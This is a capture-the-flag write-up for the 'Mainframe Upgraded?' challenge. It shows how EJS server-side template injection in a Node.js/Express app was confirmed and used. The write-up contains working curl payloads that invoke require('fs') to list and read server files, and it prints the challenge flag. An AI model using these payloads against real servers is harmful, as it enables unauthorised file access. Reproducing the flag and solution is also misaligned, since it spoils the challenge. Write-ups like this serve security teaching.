# Challenge Name

Mainframe Upgraded?

# Author

Not recovered from the exported challenge conversation.

# Description

The North Pole Mainframe website was supposedly upgraded to Node.js. It accepts a message and says to return on Christmas Eve. The objective was to work out what the backend was doing with submitted messages and recover the hidden flag.

# Solution

The mainframe website let me submit a message, but the interesting part was how the server handled that message. The page's JavaScript showed a POST request to `/system-message`, with the text stored in a `message` field. The headers also pointed to a Node.js/Express backend.

I checked the page with `curl` and tried a few common paths like `/robots.txt`, `/admin`, `/flag`, and `/package.json`, but nothing useful came back.

Next I tried template expressions in the message field. `{{7*7}}` came back unchanged, but the EJS version, `<%= 7*7 %>`, gave me `49`. That confirmed **server-side template injection (SSTI)** through EJS.

I tested whether I could reach Node.js objects from the template:

```bash
curl -s -X POST 'http://mainframe-upgraded-mainframe.chall.ybn.sg/system-message' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message=<%= process.version %>'

curl -s -X POST 'http://mainframe-upgraded-mainframe.chall.ybn.sg/system-message' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'message=<%= process.cwd() %>'
```

The server replied with `v20.19.6` and `/app`. Since I could access Node.js values, I tried listing files using `require('fs')`:

```bash
curl -s -X POST 'http://mainframe-upgraded-mainframe.chall.ybn.sg/system-message' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "message=<%= require('fs').readdirSync('.').join('\n') %>"
```

That gave me `server.js`, `node_modules`, `package.json`, and `l3ak3d_f1lgsssssss.txt`. The last one looked like the file I needed.

When I read it using `readFileSync(..., 'utf8')`, the result had `\u0000` between the letters. It looked messy, but those null bytes were a clue that the file was really **UTF-16LE**. Removing the nulls made the flag readable.

I also looked at `server.js` and saw the problem: the app was rendering user input with `ejs.render(message, upgradedContext)` while allowing access to things like `require`. That gave me a way to read files from the server.

# Flag

```text
YBN25{santa_says_ssti_h0_h0_hacked}
```

# Solved By

Kazikiri
